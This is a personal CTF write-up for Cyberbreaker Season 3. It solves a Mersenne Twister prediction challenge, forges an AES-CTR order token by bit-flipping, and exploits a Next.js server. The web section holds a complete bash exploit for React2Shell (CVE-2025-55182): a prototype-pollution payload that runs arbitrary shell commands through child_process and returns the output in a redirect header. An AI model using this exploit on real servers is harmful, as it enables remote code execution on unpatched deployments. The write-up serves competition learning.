---
title: "Writeup Cyberbreaker Season 3."
description: "Cyberbreaker Season 3 is an online jeopardy-style CTF hosted by Perisai.ai and RRQ. All Indonesians are welcome, including students and security professionals. Challenges are mostly at a medium level, so there will be challenges for everyone of all skill levels. One team must consist of 2 members"
date: "2026-05-02"
banner:
  src: "../../images/articles/cyberbreaker-season-3/thumbnail.png"
  alt: "Writeup Cyberbreaker Season 3"
categories:
  - "CTF"
keywords:
  - "CTF"
  - "CBD"
  - "Cyberbreaker"
  - "Cyber Security"
---

# Introduction

Cyberbreaker Season 3 is an online jeopardy-style CTF hosted by Perisai.ai and RRQ. All are welcome to participate, including students and security professionals. Challenges are mostly at a medium level. In this competition, I ranked around 200th while playing solo. Although my performance wasn't as strong compared to other teams, I learned valuable lessons from each challenge. In this blog, I will share my solutions and insights from the competition.


## Cryptography

### casino

We were given two files: one is an encrypted flag and the other is the source code for the casino game service

```python
#!/usr/bin/env python3
import os
import random
import secrets

FLAG = open(os.environ.get('FLAG_PATH', '/flag.txt'), 'r').read().strip()
FLAG_PRICE = 50000
STARTING_BALANCE = 1000


def prompt_int(label, lower, upper):
    raw = input(label).strip()
    value = int(raw)
    if value < lower or value > upper:
        raise ValueError
    return value


def next_ticket(rng):
    return rng.getrandbits(32)


def play_roulette(balance, rng):
    print('roulette table')
    stake = prompt_int('stake: ', 1, balance)
    guess = prompt_int('number (0-36): ', 0, 36)
    ticket = next_ticket(rng)
    winning = ticket % 37
    color = 'green' if winning == 0 else ('red' if winning % 2 else 'black')
    print(f'wheel: {winning} {color}')
    print(f'ticket id: {ticket:08x}')
    if guess == winning:
        payout = stake * 36
        balance = balance - stake + payout
        print(f'jackpot hit, paid {payout} credits')
    else:
        balance -= stake
        print('no payout this round')
    return balance


def play_slots(balance, rng):
    print('slots terminal')
    stake = prompt_int('stake: ', 1, balance)
    ticket = next_ticket(rng)
    symbols = ['Nova', 'Bell', 'Cherry', 'Seven']
    reels = [symbols[(ticket >> shift) & 0x3] for shift in (0, 2, 4)]
    print('reels: ' + ' | '.join(reels))
    print(f'ticket id: {ticket:08x}')
    if len(set(reels)) == 1:
        payout = stake * 8
        balance = balance - stake + payout
        print(f'line winner, paid {payout} credits')
    else:
        balance -= stake
        print('no payout this round')
    return balance


def buy_flag(balance):
    if balance < FLAG_PRICE:
        print(f'vip counter says you need {FLAG_PRICE} credits for the collector token')
        return False
    print(FLAG)
    return True


def main():
    balance = STARTING_BALANCE
    rng = random.Random(secrets.randbits(256))
    print('=== Starline Casino ===')
    print('Each guest session runs its own fairness stream for audit review.')

    while True:
        print()
        print(f'Balance: {balance} credits')
        print('1. Play roulette')
        print('2. Spin slots')
        print(f'3. Buy VIP flag ({FLAG_PRICE} credits)')
        print('4. Exit')
        choice = input('> ').strip()

        try:
            if choice == '1':
                balance = play_roulette(balance, rng)
            elif choice == '2':
                balance = play_slots(balance, rng)
            elif choice == '3':
                if buy_flag(balance):
                    return
            elif choice == '4':
                print('come back soon')
                return
            else:
                print('invalid option')
        except Exception:
            print('table manager rejected that input')


if __name__ == '__main__':
    main()
```

From this source code, we can analyze and find that the main vulnerability of this code is located at ```rng = random.Random(secrets.randbits(256))```
Why this is vulnerable:
- random.Random is deterministic.
- getrandbits(32) exposes raw internal PRNG output.
- The program prints every generated 32-bit ticket.
- After collecting enough outputs, the entire PRNG state can be reconstructed.

For Mersenne Twister:
- Internal state size = 624 × 32-bit integers.
- If an attacker collects 624 outputs from getrandbits(32), they can recover the full RNG state.
- Once recovered, all future roulette and slot outcomes become predictable.

What we need is to recover the entire RNG state using the code below

```python
from pwn import *
from randcrack import RandCrack
import re

HOST = "crypto.cbd2026.cloud"
PORT = 1337

rc = RandCrack()

def extract_ticket(data):
    m = re.search(rb'ticket id: ([0-9a-f]+)', data)
    if m:
        return int(m.group(1), 16)
    return None


def play_and_collect(io):
    io.sendlineafter(b'> ', b'1')     # roulette
    io.sendlineafter(b'stake: ', b'1')
    io.sendlineafter(b'number (0-36): ', b'0')

    data = io.recvuntil(b'ticket id:')
    data += io.recvline()

    ticket = extract_ticket(data)
    return ticket


def play_win(io, predicted_ticket):
    winning = predicted_ticket % 37

    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'stake: ', b'1000')
    io.sendlineafter(b'number (0-36): ', str(winning).encode())

    data = io.recvuntil(b'ticket id:')
    data += io.recvline()

    return winning


def try_buy_flag(io):
    io.sendlineafter(b'> ', b'3')
    resp = io.recvline()
    return resp


def main():
    io = remote(HOST, PORT)

    print("[*] Collecting 624 outputs...")

    count = 0
    while count < 624:
        ticket = play_and_collect(io)
        if ticket is not None:
            rc.submit(ticket)
            count += 1
            print(f"[+] {count}/624")

    print("[+] RNG state recovered!")

    while True:
        predicted = rc.predict_getrandbits(32)
        win = play_win(io, predicted)

        print(f"[+] Won with number {win}")

        resp = try_buy_flag(io)
        print(resp)

        if b'flag' in resp.lower():
            print("[FLAG]", resp.decode())
            break


if __name__ == "__main__":
    main()
```
If we try to run the code we will get the flag as shown below

```
CBC{st0p_gambling_st4rt_predicting!!_f8cad9}
```

### waifu-shop


We are given a website that can order different waifus. 

```python
ITEMS = {
    'destroyer_set': {
        'name': 'Cassin',
        'price': 120,
        'rarity': 'R',
        'tagline': 'Eagle Union destroyer. Simple, dependable, and useful for any early fleet.',
        'image': 'https://azurlane.netojuu.com/images/c/c9/Cassin.png',
        'available': True,
    },
    'royal_cruiser': {
        'name': 'Belfast',
        'price': 850,
        'rarity': 'SR',
        'tagline': 'Royal Navy light cruiser with polished support utility and enduring popularity.',
        'image': 'https://azurlane.netojuu.com/images/8/86/Belfast.png',
        'available': True,
    },
    'enterprise_gold': {
        'name': 'Enterprise',
        'price': 4800,
        'rarity': 'SSR',
        'tagline': 'Iconic Eagle Union carrier with one of the most recognizable kits in the game.',
        'image': 'https://azurlane.netojuu.com/images/4/40/Enterprise.png',
        'available': True,
    },
    'celestial_waifu': {
        'name': 'Shinano',
        'price': 999999,
        'rarity': 'UR',
        'tagline': 'Sakura Empire carrier with top-tier power and a premium collector release.',
        'image': 'https://azurlane.netojuu.com/images/a/a9/Shinano.png',
        'available': False,
    },
}
```

This website only will show the flag if we are successfull ordered item with name 'celestial_waifu' and price = '000000'. However this item always disabled.

```python
@app.post('/claim')
def claim():
    token = request.form.get('order_token', '')
    try:
        order_data = decode_order(token)
    except Exception:
        return render_template('result.html', ok=False, title='Order review', message='The fulfillment desk could not verify this order.'), 400

    if order_data.get('item') == 'celestial_waifu' and order_data.get('price') == '000000':
        return render_template('result.html', ok=True, title='Preorder secured', message=FLAG)

    name = ITEMS.get(order_data.get('item', ''), {}).get('name', 'unknown item')
    return render_template('result.html', ok=False, title='Order reviewed', message=f'Your order for {name} is valid, but it is not eligible for the limited preorder bonus.')
```

After analyzing the code, I found that every time an order request is made, it encrypts the data using AES with MODE_CTR. 

```python
def crypt(data):
    cipher = AES.new(KEY, AES.MODE_CTR, nonce=NONCE)
    return cipher.encrypt(data)
```

And this is a big problem because

```text
ciphertext = plaintext XOR keystream
plaintext  = ciphertext XOR keystream
```

The idea of the exploit is to order a normal item first. Then, we intercept the request, decrypt the data, change the values as needed, and encrypt it back.

```python
import base64

def xor_bytes(a, b):
    return bytes(x ^ y for x, y in zip(a, b))

# Example known plaintext (what the app originally encrypts)
known_plain = b"item=destroyer_set&price=000120&buyer=guest&ship=standard"

# Target modification (same-length segment only for demo)
target_plain = b"item=celestial_waifu&price=000000&buyer=guest&ship=standard"

# Your provided token
token = "GdmLYgZYZk28Thj9OGgnwImyFUfFX3B9oCYKupzaA8VDN2mXf_EnHrcq0_Fo1Kfo5cyYvvne6AUf"

# Decode
cipher = base64.urlsafe_b64decode(token + '=' * (-len(token) % 4))

# Compute delta (what needs to change in plaintext)
delta = xor_bytes(known_plain, target_plain)

# Apply delta to ciphertext (this is the vulnerability)
modified_cipher = xor_bytes(cipher, delta)

# Encode back
forged_token = base64.urlsafe_b64encode(modified_cipher).decode().rstrip('=')

print(forged_token)
```

After obtaining the new token, we send it to the /claim endpoint and we will see the flag like this

```
CBC{enterprise_is_min333_4d0b8a}
```

## Web

### northstar

We are given a website built using Node.js. After examining the package.json, I realized that this website is still vulnerable to React2Shell. React2Shell is vulnerable level high that can give you access on the server.

```javascript
"dependencies": {
    "react": "19.0.0",
    "react-dom": "19.0.0",
    "next": "16.0.6",
    "react-server-dom-webpack": "19.0.0"
  },
```

But when I tried to apply the script from [online](https://github.com/ihsansencan/React2Shell-CVE-2025-55182), I got an error because this website has a custom proxy server that does not allow more than 10 parameters and limits the POST data length to less than 1000 characters. 

```python
def validate_parameters(parameters):
    if len(parameters) > MAX_PARAMS:
        return 400, f"Too many parameters. Maximum allowed is {MAX_PARAMS}."

    blocked_term = BLOCKED_TERM.lower()

    for key, value in parameters:
        key_text = str(key)
        value_text = str(value)

        if len(key_text) > MAX_VALUE_LENGTH:
            return 400, f"Parameter name '{key_text}' exceeds {MAX_VALUE_LENGTH} characters."

        if len(value_text) > MAX_VALUE_LENGTH:
            return 400, f"Parameter '{key_text}' exceeds {MAX_VALUE_LENGTH} characters."

        if blocked_term in key_text.lower() or blocked_term in value_text.lower():
            return 403, "Request blocked by input policy."

    return None
```

So, the best way to exploit this is by modifying our own custom payload, which looks like this 

```bash
#!/bin/bash

QUIET=0
if [[ "$1" == "-q" ]]; then
    QUIET=1
    shift
fi

TARGET="${1:-http://localhost:8080}"
COMMAND="${2:-id}"

if [[ $QUIET -eq 0 ]]; then
    echo "[*] Bypassing Proxy Validation & SSL Checks..."
fi

TMPDIR=$(mktemp -d)
CHUNK0="${TMPDIR}/chunk0.json"
CHUNK1="${TMPDIR}/chunk1.json"

cleanup() {
    rm -rf "${TMPDIR}"
}
trap cleanup EXIT

ESCAPED_CMD=$(echo "$COMMAND" | sed "s/'/\\\\\\\\'/g")

PAYLOAD="var o=Buffer.from(process.mainModule.require('child_process').execSync('${ESCAPED_CMD}')).toString('base64');var e=new Error();e.digest='NEXT_REDIRECT;push;http://x/'+o+';307;';throw e;"

printf '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B0\\"}","_response":{"_prefix":"%s","_formData":{"get":"$1:constructor:constructor"}}}' "$PAYLOAD" > "${CHUNK0}"
printf '"$@0"' > "${CHUNK1}"

BOUNDARY="----WebKitFormBoundary$(openssl rand -hex 8)"

{
    printf -- "--${BOUNDARY}\r\n"
    printf "Content-Disposition: form-data; name=\"0\"\r\n\r\n"
    cat "${CHUNK0}"
    printf "\r\n--${BOUNDARY}\r\n"
    printf "Content-Disposition: form-data; name=\"1\"\r\n\r\n"
    cat "${CHUNK1}"
    printf "\r\n--${BOUNDARY}--\r\n"
} > "${TMPDIR}/full_body.bin"

RESPONSE=$(curl -s -k -L -D - \
    -X POST "${TARGET}" \
    -H "Next-Action: x" \
    -H "Content-Type: text/plain" \
    -H "Content-Type: multipart/form-data; boundary=${BOUNDARY}" \
    --data-binary "@${TMPDIR}/full_body.bin" \
    --max-time 30 \
    2>&1)

HTTP_CODE=$(echo "$RESPONSE" | grep -E "^HTTP/" | tail -1 | awk '{print $2}')
REDIRECT_HEADER=$(echo "$RESPONSE" | grep -i "^x-action-redirect:" | sed 's/^[^:]*: //' | tr -d '\r')

if [[ -n "$REDIRECT_HEADER" ]]; then
    B64_OUTPUT=$(echo "$REDIRECT_HEADER" | sed 's/;push$//' | sed 's/;replace$//' | sed 's|^http://x/||')
    OUTPUT=$(echo "$B64_OUTPUT" | base64 -d 2>/dev/null || echo "$B64_OUTPUT")

    if [[ $QUIET -eq 1 ]]; then
        echo -n "$OUTPUT"
    else
        echo "[+] Success via Header Smuggling"
        echo "----------------------------------------"
        echo "$OUTPUT"
        echo "----------------------------------------"
    fi
else
    echo "[-] Exploit failed. HTTP ${HTTP_CODE}"
    if [[ $QUIET -eq 0 ]]; then
        echo "$RESPONSE"
    fi
    exit 1
fi
```

After running that command ```./explot.sh URL "/readflag"``` we will see the flag like this

```CBC{6cc6abdf24b2ece791cff9c75f5fdddb}```
